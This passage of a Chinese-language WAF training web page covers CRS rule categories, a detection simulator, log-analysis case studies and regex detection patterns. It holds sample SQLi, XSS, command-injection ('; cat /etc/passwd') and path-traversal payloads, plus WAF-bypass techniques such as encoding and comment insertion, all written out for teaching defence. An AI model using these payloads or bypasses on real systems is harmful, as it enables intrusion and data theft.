REQUEST-930-APPLICATION-ATTACK-LFI <span class="code-comment"># LFI 攻擊</span>
REQUEST-931-APPLICATION-ATTACK-RFI <span class="code-comment"># RFI 攻擊</span>
REQUEST-932-APPLICATION-ATTACK-RCE <span class="code-comment"># RCE 攻擊</span>
REQUEST-933-APPLICATION-ATTACK-PHP <span class="code-comment"># PHP 攻擊</span>
REQUEST-941-APPLICATION-ATTACK-XSS <span class="code-comment"># XSS 攻擊</span>
REQUEST-942-APPLICATION-ATTACK-SQLI <span class="code-comment"># SQL 注入</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Interactive WAF Demo -->
            <div class="rule-demo">
                <h3 style="margin-bottom: 1rem;">WAF 即時偵測模擬器</h3>
                <p style="color: var(--text-secondary); margin-bottom: 1rem;">輸入一段 payload 來測試 WAF 是否會偵測到攻擊：</p>

                <div class="rule-input-group">
                    <input type="text" id="waf-input" placeholder="輸入測試 payload，例如：' OR 1=1--">
                    <button class="btn btn-primary" onclick="checkWAF()">檢測</button>
                </div>

                <div id="waf-result"></div>

                <div style="margin-top: 1rem;">
                    <p style="color: var(--text-secondary); font-size: 0.875rem;">快速測試：</p>
                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.5rem;">
                        <button class="btn btn-secondary" data-payload="' OR '1'='1">SQLi 基本</button>
                        <button class="btn btn-secondary" data-payload="&lt;script&gt;alert(1)&lt;/script&gt;">XSS 基本</button>
                        <button class="btn btn-secondary" data-payload="; cat /etc/passwd">命令注入</button>
                        <button class="btn btn-secondary" data-payload="../../../etc/passwd">路徑穿越</button>
                        <button class="btn btn-secondary" data-payload="hello world">正常輸入</button>
                    </div>
                </div>
            </div>
        </section>

        <!-- Bypass Techniques -->
        <section id="bypass">
            <h2>WAF 繞過技術</h2>
            <p style="color: var(--text-secondary); margin-bottom: 2rem;">了解攻擊者如何嘗試繞過 WAF，有助於設計更強健的防護規則。</p>

            <div class="card-grid">
                <div class="card">
                    <h3><span class="icon">[01]</span> 大小寫變換</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 原始</span>
UNION SELECT

<span class="code-comment"># 繞過嘗試</span>
<span class="code-danger">UnIoN SeLeCt</span>
<span class="code-danger">uNiOn sElEcT</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>防護：</strong>使用 (?i) 標記進行大小寫不敏感匹配
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[02]</span> 編碼繞過</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># URL 編碼</span>
<span class="code-danger">%27%20OR%20%271%27=%271</span>

<span class="code-comment"># 雙重編碼</span>
<span class="code-danger">%252f%252e%252e</span>

<span class="code-comment"># Unicode</span>
<span class="code-danger">%u0027</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>防護：</strong>在檢測前進行多層解碼
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[03]</span> 註解插入</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># SQL 註解</span>
<span class="code-danger">UN/**/ION/**/SEL/**/ECT</span>
<span class="code-danger">UNION/*!50000SELECT*/</span>

<span class="code-comment"># HTML 註解</span>
<span class="code-danger">&lt;scr&lt;!--test--&gt;ipt&gt;</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>防護：</strong>移除註解後再進行檢測
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[04]</span> 空白字符變換</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># Tab 代替空格</span>
<span class="code-danger">UNION[TAB]SELECT</span>

<span class="code-comment"># 換行符</span>
<span class="code-danger">UNION%0aSELECT</span>

<span class="code-comment"># 多個空格</span>
<span class="code-danger">UNION    SELECT</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>防護：</strong>使用 \s+ 匹配任意空白字符
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[05]</span> 同義詞替換</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># OR 的替代</span>
<span class="code-danger">|| (管道符)</span>

<span class="code-comment"># 空格替代</span>
<span class="code-danger">UNION+SELECT</span>

<span class="code-comment"># 函數替代</span>
<span class="code-danger">CHAR(39) 代替 '</span>
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>防護：</strong>規則涵蓋各種同義表達
                    </p>
                </div>

                <div class="card">
                    <h3><span class="icon">[06]</span> 參數污染</h3>
                    <div class="code-block">
                        <code>
<span class="code-comment"># HPP (HTTP Parameter Pollution)</span>
<span class="code-danger">?id=1&id=UNION&id=SELECT</span>

<span class="code-comment"># 不同服務器處理方式</span>
Apache: 取最後一個
IIS: 合併所有
Tomcat: 取第一個
                        </code>
                    </div>
                    <p style="margin-top: 1rem; font-size: 0.875rem; color: var(--text-secondary);">
                        <strong>防護：</strong>檢測所有重複參數
                    </p>
                </div>
            </div>
        </section>

        <!-- WAF Log Analysis Section -->
        <section id="log-analysis">
            <h2>WAF 日誌分析實戰</h2>
            <p style="color: var(--text-secondary); margin-bottom: 2rem;">學習如何閱讀與分析真實的 WAF 阻擋日誌，理解結構與關鍵資訊，快速定位問題根因。</p>

            <!-- Log Structure Overview -->
            <div class="accordion active">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>WAF 日誌結構概覽</h4>
                    <span class="accordion-icon">▼</span>
                </div>
                <div class="accordion-content" style="max-height: 2000px; padding: 1.25rem;">
                    <p style="margin-bottom: 1rem;">WAF 日誌通常包含以下核心欄位，理解這些欄位有助於快速分析問題：</p>
                    <div class="code-block">
                        <code>
<span class="code-comment"># 核心識別資訊</span>
<span class="code-keyword">id</span>                  <span class="code-comment"># 日誌唯一識別碼</span>
<span class="code-keyword">requestDatetime</span>     <span class="code-comment"># 請求時間 (UTC)</span>

<span class="code-comment"># 請求基本資訊</span>
<span class="code-keyword">method</span>              <span class="code-comment"># HTTP 方法 (GET/POST/PUT/DELETE)</span>
<span class="code-keyword">url</span>                 <span class="code-comment"># 請求路徑 (通常 Base64 編碼)</span>
<span class="code-keyword">host</span>                <span class="code-comment"># 目標主機</span>
<span class="code-keyword">clientIp</span>            <span class="code-comment"># 來源 IP</span>
<span class="code-keyword">clientPort</span>          <span class="code-comment"># 來源埠號</span>

<span class="code-comment"># 執行狀態</span>
<span class="code-keyword">requestStatus</span>       <span class="code-comment"># 請求狀態 (blocked/passed)</span>
<span class="code-keyword">enforcementAction</span>   <span class="code-comment"># 執行動作 (block/allow/alarm)</span>
<span class="code-keyword">responseCode</span>        <span class="code-comment"># HTTP 回應碼</span>

<span class="code-comment"># 違規詳情</span>
<span class="code-keyword">violations[]</span>        <span class="code-comment"># 違規項目陣列</span>
<span class="code-keyword">enforcementState</span>    <span class="code-comment"># 整體執行狀態與威脅等級</span>
<span class="code-keyword">attackType[]</span>        <span class="code-comment"># 偵測到的攻擊類型</span>

<span class="code-comment"># 原始請求</span>
<span class="code-keyword">rawRequest</span>          <span class="code-comment"># Base64 編碼的原始 HTTP 請求</span>
<span class="code-keyword">requestPolicy</span>       <span class="code-comment"># 套用的安全策略名稱</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>常見違規類型說明</h4>
                    <span class="accordion-icon">▼</span>
                </div>
                <div class="accordion-content">
                    <div class="code-block">
                        <code>
<span class="code-comment"># 威脅評分相關</span>
<span class="code-danger">VIOL_RATING_THREAT</span>    <span class="code-comment"># 威脅評分超過閾值</span>

<span class="code-comment"># 客戶端行為</span>
<span class="code-danger">VIOL_BOT_CLIENT</span>       <span class="code-comment"># 偵測到 Bot/自動化工具</span>

<span class="code-comment"># HTTP 協議相關</span>
<span class="code-danger">VIOL_HTTP_RESPONSE_STATUS</span>  <span class="code-comment"># 異常 HTTP 回應狀態</span>

<span class="code-comment"># 資料格式相關</span>
<span class="code-danger">VIOL_JSON_MALFORMED</span>   <span class="code-comment"># JSON 格式錯誤/攻擊</span>
<span class="code-danger">VIOL_XML_MALFORMED</span>    <span class="code-comment"># XML 格式錯誤/攻擊</span>

<span class="code-comment"># 內容檢查</span>
<span class="code-danger">VIOL_PARAMETER</span>        <span class="code-comment"># 參數違規</span>
<span class="code-danger">VIOL_ATTACK_SIGNATURE</span> <span class="code-comment"># 匹配攻擊特徵</span>
                        </code>
                    </div>
                </div>
            </div>

            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>攻擊類型 (attackType) 說明</h4>
                    <span class="accordion-icon">▼</span>
                </div>
                <div class="accordion-content">
                    <div class="code-block">
                        <code>
<span class="code-comment"># 客戶端識別</span>
<span class="code-string">"Non-browser Client"</span>      <span class="code-comment"># 非瀏覽器用戶端 (如程式 API 呼叫)</span>

<span class="code-comment"># 資訊洩漏</span>
<span class="code-string">"Information Leakage"</span>     <span class="code-comment"># 可能洩漏敏感資訊</span>

<span class="code-comment"># 應用程式活動</span>
<span class="code-string">"Other Application Activity"</span>  <span class="code-comment"># 其他應用程式異常活動</span>
<span class="code-string">"Abuse of Functionality"</span>  <span class="code-comment"># 功能濫用</span>

<span class="code-comment"># 解析器攻擊</span>
<span class="code-string">"JSON Parser Attack"</span>      <span class="code-comment"># JSON 解析器攻擊</span>
<span class="code-string">"XML Parser Attack"</span>       <span class="code-comment"># XML 解析器攻擊</span>
                        </code>
                    </div>
                </div>
            </div>

            <!-- Case Studies -->
            <h3 style="margin-top: 3rem; margin-bottom: 1.5rem; font-family: 'JetBrains Mono', monospace; color: var(--amber); font-size: 0.875rem; text-transform: uppercase; letter-spacing: 0.1em;">案例分析</h3>

            <!-- Case 1: Non-browser API Client -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-high">CASE 1</span>
                <h3><span class="icon">[API]</span> 非瀏覽器客戶端 API 請求被阻擋</h3>
                <p style="margin-bottom: 1rem;">常見情境：後端服務間 API 呼叫被誤判為威脅</p>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">脫敏後的日誌範例：</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>{
  <span class="code-keyword">"id"</span>: <span class="code-string">"2360740580025XXXXXX"</span>,
  <span class="code-keyword">"requestDatetime"</span>: <span class="code-string">"2025-11-27T11:52:09Z"</span>,
  <span class="code-keyword">"method"</span>: <span class="code-string">"GET"</span>,
  <span class="code-keyword">"url"</span>: <span class="code-string">"L29hcGkvYXBpL3Byb2R1Y3Qv..."</span>,  <span class="code-comment">// Base64: /oapi/api/product/...</span>
  <span class="code-keyword">"clientIp"</span>: <span class="code-string">"xxx.xxx.xxx.xxx"</span>,
  <span class="code-keyword">"requestStatus"</span>: <span class="code-danger">"blocked"</span>,
  <span class="code-keyword">"enforcementAction"</span>: <span class="code-danger">"block"</span>,
  <span class="code-keyword">"responseCode"</span>: <span class="code-danger">429</span>,
  <span class="code-keyword">"violations"</span>: [
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-string">"VIOL_HTTP_RESPONSE_STATUS"</span> }, <span class="code-keyword">"isBlocked"</span>: false },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-danger">"VIOL_RATING_THREAT"</span> }, <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span> },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-string">"VIOL_BOT_CLIENT"</span> }, <span class="code-keyword">"isBlocked"</span>: false }
  ],
  <span class="code-keyword">"enforcementState"</span>: {
    <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span>,
    <span class="code-keyword">"rating"</span>: <span class="code-danger">4</span>,
    <span class="code-keyword">"attackType"</span>: [
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Non-browser Client"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Information Leakage"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Other Application Activity"</span> }
    ]
  },
  <span class="code-keyword">"rawRequest"</span>: {
    <span class="code-keyword">"httpRequest"</span>: <span class="code-string">"R0VUIC9vYXBpLy4uLg=="</span>  <span class="code-comment">// Base64 編碼的原始請求</span>
  }
}</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--cyan); font-size: 0.875rem;">解碼 rawRequest 分析：</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code><span class="code-comment"># 解碼後的 HTTP 請求 (已脫敏)</span>
GET /oapi/api/product/xxx/product/details? HTTP/1.1
Host: merchant-oapi.example.com
<span class="code-danger">User-Agent: Go-http-client/1.1</span>  <span class="code-comment"># ← 關鍵! 非瀏覽器 UA</span>
Content-Type: application/json
X-Auth-Token: eyJhbGciOi...  <span class="code-comment"># JWT Token (已遮蔽)</span>
Accept-Encoding: gzip

[{"skuCode":"P00XXXXX_S_IP919XXXX"}...]  <span class="code-comment"># 請求 Body</span></code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">分析重點：</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;"><strong>阻擋原因</strong>：<code style="color: var(--danger);">VIOL_RATING_THREAT</code> 是實際造成阻擋的違規</li>
                    <li style="margin-bottom: 0.5rem;"><strong>User-Agent</strong>：<code style="color: var(--amber);">Go-http-client/1.1</code> 觸發了 "Non-browser Client" 偵測</li>
                    <li style="margin-bottom: 0.5rem;"><strong>rating: 4</strong>：威脅評分達到閾值 (通常 4-5 會被阻擋)</li>
                    <li style="margin-bottom: 0.5rem;"><strong>responseCode: 429</strong>：後端回傳 Too Many Requests，加重了威脅評分</li>
                </ul>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">解決建議：</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">將合法 API 客戶端 IP 加入 WAF 白名單</li>
                    <li style="margin-bottom: 0.5rem;">為內部服務設定自訂 User-Agent 並加入例外</li>
                    <li style="margin-bottom: 0.5rem;">調整威脅評分閾值或特定 API 路徑的敏感度</li>
                </ul>
            </div>

            <!-- Case 2: Python Requests Client -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-high">CASE 2</span>
                <h3><span class="icon">[BOT]</span> Python 自動化腳本被識別為 Bot</h3>
                <p style="margin-bottom: 1rem;">常見情境：自動化測試或批次處理腳本被阻擋</p>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">脫敏後的日誌範例：</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>{
  <span class="code-keyword">"id"</span>: <span class="code-string">"1759108076183XXXXXX"</span>,
  <span class="code-keyword">"method"</span>: <span class="code-string">"POST"</span>,
  <span class="code-keyword">"url"</span>: <span class="code-string">"L29hcGkvYXBpL29yZGVyL..."</span>,  <span class="code-comment">// Base64: /oapi/api/order/updateOrderStatus</span>
  <span class="code-keyword">"requestStatus"</span>: <span class="code-danger">"blocked"</span>,
  <span class="code-keyword">"responseCode"</span>: <span class="code-danger">500</span>,
  <span class="code-keyword">"violations"</span>: [
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-string">"VIOL_HTTP_RESPONSE_STATUS"</span> }, <span class="code-keyword">"isBlocked"</span>: false },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-danger">"VIOL_RATING_THREAT"</span> }, <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span> },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-string">"VIOL_BOT_CLIENT"</span> }, <span class="code-keyword">"isBlocked"</span>: false }
  ],
  <span class="code-keyword">"enforcementState"</span>: {
    <span class="code-keyword">"rating"</span>: <span class="code-danger">4</span>,
    <span class="code-keyword">"attackType"</span>: [
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Non-browser Client"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Information Leakage"</span> }
    ]
  }
}</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--cyan); font-size: 0.875rem;">解碼 rawRequest 分析：</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code><span class="code-comment"># 解碼後的 HTTP 請求 (已脫敏)</span>
POST /oapi/api/order/updateOrderStatus HTTP/1.1
Host: merchant-oapi.example.com
<span class="code-danger">User-Agent: python-requests/2.25.1</span>  <span class="code-comment"># ← 關鍵! Python 庫預設 UA</span>
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: application/json
x-auth-token: eyJhbGciOi...

[{"orderNumber": "H251126XXXXX-HXXXXXX", "status": "PICKED", "trackingId": "XXXXXXXXXX"}]</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">分析重點：</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;"><strong>User-Agent</strong>：<code style="color: var(--danger);">python-requests/2.25.1</code> 是 Python requests 庫的預設值</li>
                    <li style="margin-bottom: 0.5rem;"><strong>responseCode: 500</strong>：後端錯誤也可能提高威脅評分</li>
                    <li style="margin-bottom: 0.5rem;"><strong>合法請求</strong>：這是正常的訂單狀態更新 API 呼叫</li>
                </ul>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">解決建議：</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">在程式中設定自訂 User-Agent：<code style="color: var(--phosphor);">headers = {'User-Agent': 'MyApp/1.0 (Internal Service)'}</code></li>
                    <li style="margin-bottom: 0.5rem;">與 WAF 管理員協調，將特定 API 端點排除 Bot 檢測</li>
                </ul>
            </div>

            <!-- Case 3: JSON Malformed -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-critical">CASE 3</span>
                <h3><span class="icon">[JSON]</span> JSON 格式錯誤導致解析器攻擊偵測</h3>
                <p style="margin-bottom: 1rem;">常見情境：大型 JSON 請求或特殊字元觸發格式檢查</p>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">脫敏後的日誌範例：</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>{
  <span class="code-keyword">"id"</span>: <span class="code-string">"1051815027092XXXXXX"</span>,
  <span class="code-keyword">"method"</span>: <span class="code-string">"PUT"</span>,
  <span class="code-keyword">"url"</span>: <span class="code-string">"L3Byb2R1Y3QvbGl0dGxlLW..."</span>,  <span class="code-comment">// Base64: /product/little-mall/products</span>
  <span class="code-keyword">"requestStatus"</span>: <span class="code-danger">"blocked"</span>,
  <span class="code-keyword">"responseCode"</span>: <span class="code-danger">0</span>,  <span class="code-comment">// 請求未到達後端</span>
  <span class="code-keyword">"violations"</span>: [
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-danger">"VIOL_JSON_MALFORMED"</span> }, <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span> },
    { <span class="code-keyword">"violation"</span>: { <span class="code-keyword">"name"</span>: <span class="code-danger">"VIOL_RATING_THREAT"</span> }, <span class="code-keyword">"isBlocked"</span>: <span class="code-danger">true</span> }
  ],
  <span class="code-keyword">"enforcementState"</span>: {
    <span class="code-keyword">"rating"</span>: <span class="code-danger">4</span>,
    <span class="code-keyword">"attackType"</span>: [
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Abuse of Functionality"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-string">"Other Application Activity"</span> },
      { <span class="code-keyword">"name"</span>: <span class="code-danger">"JSON Parser Attack"</span> }
    ]
  },
  <span class="code-keyword">"rawRequest"</span>: {
    <span class="code-keyword">"actualSize"</span>: <span class="code-danger">4999</span>,  <span class="code-comment"># 較大的請求</span>
    <span class="code-keyword">"isTruncated"</span>: <span class="code-danger">true</span>  <span class="code-comment"># 日誌被截斷</span>
  },
  <span class="code-keyword">"requestPolicy"</span>: { <span class="code-keyword">"fullPath"</span>: <span class="code-string">"xxx_specific_xss_bypass"</span> }
}</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--cyan); font-size: 0.875rem;">解碼 rawRequest 分析：</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code><span class="code-comment"># 解碼後的 HTTP 請求 (已脫敏)</span>
PUT /product/xxx/products HTTP/1.1
Host: merchant-product-api.example.com
Content-Length: 7457
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
Authorization: Bearer ****** <span class="code-comment"># 已遮蔽</span>

{"product": {
  "id": "692757XXXXXX",
  "sku_name_ch": "商品名稱包含特殊字元...",
  "sku_long_description_ch": "<span class="code-danger">&lt;p&gt;&lt;strong&gt;...HTML 內容...&lt;/strong&gt;&lt;/p&gt;</span>
    <span class="code-danger">&lt;img src=\"https://...\"&gt;</span>..."  <span class="code-comment"># ← 可能被截斷或包含問題字元</span>
  ...
}}</code>
                </div>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">分析重點：</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;"><strong>VIOL_JSON_MALFORMED</strong>：JSON 格式檢查失敗</li>
                    <li style="margin-bottom: 0.5rem;"><strong>isTruncated: true</strong>：日誌過大被截斷，可能導致解析問題</li>
                    <li style="margin-bottom: 0.5rem;"><strong>actualSize: 4999</strong>：請求體較大 (約 5KB)</li>
                    <li style="margin-bottom: 0.5rem;"><strong>HTML 內容</strong>：JSON 中嵌入的 HTML 可能包含觸發規則的字元</li>
                    <li style="margin-bottom: 0.5rem;"><strong>responseCode: 0</strong>：請求在 WAF 層就被阻擋，未到達後端</li>
                </ul>

                <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">解決建議：</h4>
                <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">檢查 JSON 格式是否正確，特別是特殊字元的跳脫</li>
                    <li style="margin-bottom: 0.5rem;">若為合法 HTML 內容，調整 WAF 策略以允許特定欄位含有 HTML</li>
                    <li style="margin-bottom: 0.5rem;">考慮對大型內容進行分段上傳或 Base64 編碼</li>
                </ul>
            </div>

            <!-- Log Analysis Tips -->
            <div class="rule-demo" style="margin-top: 2rem;">
                <h3 style="margin-bottom: 1rem;">快速分析流程</h3>
                <div class="code-block">
                    <code>
<span class="code-keyword">STEP 1:</span> 確認阻擋狀態
└─ 檢查 <span class="code-string">requestStatus</span> 和 <span class="code-string">enforcementAction</span>

<span class="code-keyword">STEP 2:</span> 找出造成阻擋的違規
└─ 在 <span class="code-string">violations[]</span> 中找 <span class="code-danger">isBlocked: true</span> 的項目

<span class="code-keyword">STEP 3:</span> 分析威脅類型
└─ 查看 <span class="code-string">enforcementState.attackType[]</span> 了解具體原因

<span class="code-keyword">STEP 4:</span> 解碼原始請求
└─ 使用 Base64 解碼 <span class="code-string">rawRequest.httpRequest</span>
└─ 找出觸發規則的 Header 或 Body 內容

<span class="code-keyword">STEP 5:</span> 決定處理方式
├─ <span class="code-phosphor">合法請求被誤擋</span> → 調整 WAF 規則/白名單
└─ <span class="code-danger">實際攻擊</span> → 加強監控/封鎖來源
                    </code>
                </div>
            </div>

            <!-- Base64 Decoder Tool -->
            <div class="rule-demo" style="margin-top: 2rem;">
                <h3 style="margin-bottom: 1rem;">Base64 解碼工具</h3>
                <p style="color: var(--text-secondary); margin-bottom: 1rem;">貼上 WAF 日誌中的 Base64 編碼字串，快速解碼查看原始內容：</p>

                <div class="rule-input-group">
                    <input type="text" id="base64-input" placeholder="貼上 Base64 編碼字串，例如：L29hcGkvYXBpL3Byb2R1Y3Qv...">
                    <button class="btn btn-primary" onclick="decodeBase64()">解碼</button>
                </div>

                <div id="base64-result"></div>

                <div style="margin-top: 1rem;">
                    <p style="color: var(--text-secondary); font-size: 0.875rem;">範例測試：</p>
                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.5rem;">
                        <button class="btn btn-secondary" onclick="setBase64('L29hcGkvYXBpL3Byb2R1Y3QvaGt0di9wcm9kdWN0L2RldGFpbHM=')">/oapi/api/...</button>
                        <button class="btn btn-secondary" onclick="setBase64('L29hcGkvYXBpL29yZGVyL3VwZGF0ZU9yZGVyU3RhdHVz')">/oapi/api/order/...</button>
                        <button class="btn btn-secondary" onclick="setBase64('L3Byb2R1Y3QvbGl0dGxlLW1hbGwvcHJvZHVjdHM=')">/product/...</button>
                    </div>
                </div>
            </div>
        </section>

        <!-- Interactive Quiz Section -->
        <section id="quiz">
            <h2>實戰練習</h2>

            <div class="progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="quiz-progress" style="width: 0%"></div>
                </div>
                <div class="progress-text">
                    <span>進度</span>
                    <span id="quiz-score">0 / 5</span>
                </div>
            </div>

            <div class="quiz-container">
                <div id="quiz-content">
                    <!-- Quiz questions will be loaded here -->
                </div>
                <div style="display: flex; gap: 1rem; margin-top: 1.5rem;">
                    <button class="btn btn-secondary" id="prev-btn" onclick="prevQuestion()" disabled>上一題</button>
                    <button class="btn btn-primary" id="next-btn" onclick="nextQuestion()">下一題</button>
                </div>
            </div>
        </section>

        <!-- Best Practices -->
        <section id="best-practices">
            <h2>WAF 最佳實踐</h2>

            <div class="card-grid">
                <div class="card">
                    <h3><span class="icon">[LAYER]</span> 分層防禦</h3>
                    <p>WAF 只是防線之一，應結合輸入驗證、參數化查詢、CSP 等多層防護。</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[LOG]</span> 監控與日誌</h3>
                    <p>持續監控 WAF 日誌，分析攻擊模式，並調整規則以減少誤報。</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[SYNC]</span> 定期更新</h3>
                    <p>保持 WAF 規則集更新，以應對新型攻擊技術。</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[TEST]</span> 測試驗證</h3>
                    <p>在部署前進行充分測試，確保規則不會影響正常業務流量。</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[CONF]</span> 平衡安全與可用性</h3>
                    <p>規則過於嚴格會導致誤報，過於寬鬆則無法有效防護，需找到平衡點。</p>
                </div>
                <div class="card">
                    <h3><span class="icon">[RULE]</span> 自訂規則</h3>
                    <p>根據應用程式特性，自訂專屬規則以提供更精準的保護。</p>
                </div>
            </div>
        </section>

        <!-- Resources -->
        <section id="resources">
            <h2>延伸資源</h2>
            <div class="card">
                <h3><span class="icon">[REF]</span> 推薦學習資源</h3>
                <ul style="color: var(--text-secondary); margin-top: 1rem; padding-left: 1.5rem; list-style: none;">
                    <li style="margin-bottom: 0.75rem;"><span style="color: var(--text-dim); margin-right: 0.5rem;">-></span><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank" style="color: var(--phosphor);">OWASP Web Security Testing Guide</a></li>
                    <li style="margin-bottom: 0.75rem;"><span style="color: var(--text-dim); margin-right: 0.5rem;">-></span><a href="https://owasp.org/www-project-modsecurity-core-rule-set/" target="_blank" style="color: var(--phosphor);">OWASP ModSecurity Core Rule Set</a></li>
                    <li style="margin-bottom: 0.75rem;"><span style="color: var(--text-dim); margin-right: 0.5rem;">-></span><a href="https://portswigger.net/web-security" target="_blank" style="color: var(--phosphor);">PortSwigger Web Security Academy</a></li>
                    <li style="margin-bottom: 0.75rem;"><span style="color: var(--text-dim); margin-right: 0.5rem;">-></span><a href="https://github.com/payloadbox" target="_blank" style="color: var(--phosphor);">PayloadBox - Payload 收集</a></li>
                </ul>
            </div>
        </section>
    </div>

    <!-- Footer -->
    <footer>
        <p>What The WAF - WAF 學習平台</p>
        <p style="margin-top: 0.5rem;">僅供教育學習用途，請勿用於非法活動</p>
    </footer>

    <script>
        // Tab switching
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                const tabId = tab.dataset.tab;

                // Update tab buttons
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');

                // Update tab content
                document.querySelectorAll('.tab-content').forEach(content => {
                    content.classList.remove('active');
                });
                document.getElementById(tabId).classList.add('active');
            });
        });

        // Accordion
        function toggleAccordion(header) {
            const accordion = header.parentElement;
            accordion.classList.toggle('active');
        }

        // WAF Detection Simulator
        const wafRules = [
            { pattern: /('|"|;|--|#|\/\*|\*\/)/i, type: 'SQL Injection', desc: '偵測到 SQL 特殊字符' },
            { pattern: /(union\s+select|select\s+.*\s+from|insert\s+into|delete\s+from|drop\s+table|update\s+.*\s+set)/i, type: 'SQL Injection', desc: '偵測到 SQL 關鍵字組合' },
            { pattern: /(or|and)\s+[\d\w]+\s*=\s*[\d\w]+/i, type: 'SQL Injection', desc: '偵測到邏輯繞過嘗試' },
            { pattern: /(<script|javascript:|on\w+\s*=|<iframe|<img\s+[^>]*onerror)/i, type: 'XSS', desc: '偵測到 XSS 攻擊模式' },
